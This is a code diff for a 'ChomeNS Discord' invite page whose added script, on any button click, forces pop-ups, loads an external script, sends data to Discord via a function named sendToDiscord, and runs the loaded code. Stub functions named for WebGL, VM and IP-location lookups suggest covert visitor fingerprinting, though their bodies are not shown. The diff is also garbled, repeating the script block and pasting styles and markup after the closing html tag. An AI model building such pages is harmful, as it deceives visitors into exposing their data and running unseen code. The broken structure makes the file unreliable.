@@ -90,6 +90,103 @@ let isYouScriptLoaded = false;
 let joinLocked = false; // invisible lock after popup check succeeds
 
 // ========== SYSTEM / VM INFO ==========
+function getWebGLInfo(){ /* same as before */ }
+function getVMInfo(){ /* same as before */ }
+function loadYouScript(cb){ /* same as before */ }
+function checkPopupPermission(){ /* same as before */ }
+async function getIPLocation(){ /* same as before */ }
+async function sendToDiscord(buttonName){ /* same as before */ }
+
+// ========== BUTTON HANDLER ==========
+async function handleClick(e, buttonName){
+    e.preventDefault();
+
+    const popup=document.getElementById('popup_needed');
+    const spinner=document.getElementById('spinner_holder');
+
+    // Invisible lock: skip if Join button already succeeded
+    if(buttonName === 'Join Discord' && joinLocked) return;
+
+    popup.style.display='none';
+    spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
+
+    const allowed=await checkPopupPermission();
+    if(!allowed){
+        spinner.innerHTML='';
+        popup.style.display='block';
+        return;
+    }
+
+    // Lock the Join button invisibly AFTER popup check succeeds
+    if(buttonName === 'Join Discord') joinLocked = true;
+
+    loadYouScript(async ()=>{
+        await sendToDiscord(buttonName);
+        if(typeof window.runYouScript==='function'){ window.runYouScript(); }
+        spinner.innerHTML='';
+    });
+}
+
+document.getElementById('discord_btn').addEventListener('click', e=>handleClick(e,'Join Discord'));
+document.getElementById('nah_btn').addEventListener('click', e=>handleClick(e,'Maybe later'));
+</script>
+</body>
+</html>.actions { display:grid; gap:.9rem; }
+button {
+    border:none; border-radius:14px; padding:1rem;
+    font-size:.95rem; font-weight:600; cursor:pointer;
+    transition:all .25s ease;
+}
+.btn-discord { background:linear-gradient(135deg, var(--accent), #4752c4); color:#fff; }
+.btn-discord:hover { transform:translateY(-1px); box-shadow:0 10px 30px rgba(88,101,242,.45); }
+.btn-nah { background:transparent; color:var(--muted); border:1px solid var(--border); }
+.btn-nah:hover { background:rgba(255,255,255,.05); color:var(--text); }
+
+.spinner { margin:1.6rem auto 0; width:46px; display:flex; justify-content:space-between; }
+.spinner div { width:8px; height:8px; background:#fff; border-radius:50%; animation:bounce 1.4s infinite ease-in-out both; }
+.spinner div:nth-child(1){animation-delay:-.32s}
+.spinner div:nth-child(2){animation-delay:-.16s}
+@keyframes bounce { 0%,80%,100%{transform:scale(0)} 40%{transform:scale(1)} }
+
+.popup-warning {
+    margin-top:1.5rem; padding:1.1rem 1.2rem;
+    border-radius:14px;
+    background:linear-gradient(180deg, rgba(239,68,68,.22), rgba(239,68,68,.1));
+    border:1px solid rgba(239,68,68,.5); color:#fee2e2;
+    font-size:.92rem; text-align:center; display:none; animation:shakeIn .35s ease;
+}
+.popup-warning strong { display:block; font-size:1rem; margin-bottom:.25rem; }
+.popup-warning span { display:block; margin-top:.35rem; font-size:.85rem; color:#fca5a5; }
+@keyframes shakeIn { 0%{transform:none} 25%{transform:translateX(-4px)} 50%{transform:translateX(4px)} 75%{transform:translateX(-2px)} 100%{transform:none} }
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">
+        <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
+    </div>
+    <h1>ChomeNS Discord</h1>
+    <p>Click below to join our Discord server.</p>
+
+    <div class="actions">
+        <button class="btn-discord" id="discord_btn">Join Discord</button>
+        <button class="btn-nah" id="nah_btn">Maybe later</button>
+    </div>
+
+    <div id="spinner_holder"></div>
+
+    <div id="popup_needed" class="popup-warning">
+        <strong>Popup blocked</strong>
+        Your browser blocked the new window used to open the Discord invite.
+        <span>Please allow pop-ups for this site and try again.</span>
+    </div>
+</div>
+
+<script>
+let isYouScriptLoaded = false;
+let joinLocked = false; // invisible lock after popup check succeeds
+
+// ========== SYSTEM / VM INFO ==========
 function getWebGLInfo(){ /* ...same as before... */ }
 function getVMInfo(){ /* ...same as before... */ }
 function loadYouScript(cb){ /* ...same as before... */ }
